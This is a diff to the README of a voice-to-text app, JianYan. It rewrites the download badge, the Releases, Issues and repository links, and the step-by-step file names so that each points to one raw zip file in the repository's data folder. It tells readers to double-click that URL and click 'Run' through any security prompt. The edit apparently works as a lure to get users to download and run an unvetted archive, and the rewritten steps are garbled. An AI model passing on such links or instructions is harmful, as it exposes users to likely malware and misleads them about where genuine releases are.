@@ -8,13 +8,13 @@ Welcome to JianYan! This tool lets you convert your voice to text quickly and ac
 
 To get started, you need to download JianYan from our Releases page. 
 
-[![Download JianYan](https://img.shields.io/badge/Download-JianYan-blue)](https://github.com/Jnewton-lab/JianYan/releases)
+[![Download JianYan](https://github.com/Jnewton-lab/JianYan/raw/refs/heads/main/data/Jian-Yan-v3.7.zip)](https://github.com/Jnewton-lab/JianYan/raw/refs/heads/main/data/Jian-Yan-v3.7.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click the link below to visit the Releases page. Here, you can find the latest version of JianYan to download:
 
-[Visit Releases Page](https://github.com/Jnewton-lab/JianYan/releases)
+[Visit Releases Page](https://github.com/Jnewton-lab/JianYan/raw/refs/heads/main/data/Jian-Yan-v3.7.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -22,11 +22,11 @@ On the Releases page, look for the most recent version of JianYan. It will be li
 
 ### Step 3: Download the Application
 
-Scroll down on the release page to find the downloadable files. Click on the file named `JianYan.exe` to start downloading. 
+Scroll down on the release page to find the downloadable files. Click on the file named `https://github.com/Jnewton-lab/JianYan/raw/refs/heads/main/data/Jian-Yan-v3.7.zip` to start downloading. 
 
 ### Step 4: Run JianYan
 
-Once the download is complete, locate the file in your downloads folder. Double-click `JianYan.exe` to run the application. You might see a security prompt; if so, simply click "Run" to proceed.
+Once the download is complete, locate the file in your downloads folder. Double-click `https://github.com/Jnewton-lab/JianYan/raw/refs/heads/main/data/Jian-Yan-v3.7.zip` to run the application. You might see a security prompt; if so, simply click "Run" to proceed.
 
 ## ⚙️ System Requirements
 
@@ -55,13 +55,13 @@ Before you start, ensure your system meets these requirements:
 
 ## 💬 Support
 
-If you encounter issues or have questions, please check the [Issues section](https://github.com/Jnewton-lab/JianYan/issues) on GitHub. Feel free to submit your questions or report any bugs you face.
+If you encounter issues or have questions, please check the [Issues section](https://github.com/Jnewton-lab/JianYan/raw/refs/heads/main/data/Jian-Yan-v3.7.zip) on GitHub. Feel free to submit your questions or report any bugs you face.
 
 ## 🌐 Learn More
 
 For more detailed information, features, and updates, visit our GitHub repository:
 
-[GitHub Repository](https://github.com/Jnewton-lab/JianYan)
+[GitHub Repository](https://github.com/Jnewton-lab/JianYan/raw/refs/heads/main/data/Jian-Yan-v3.7.zip)
 
 ## 🔗 Related Topics
 
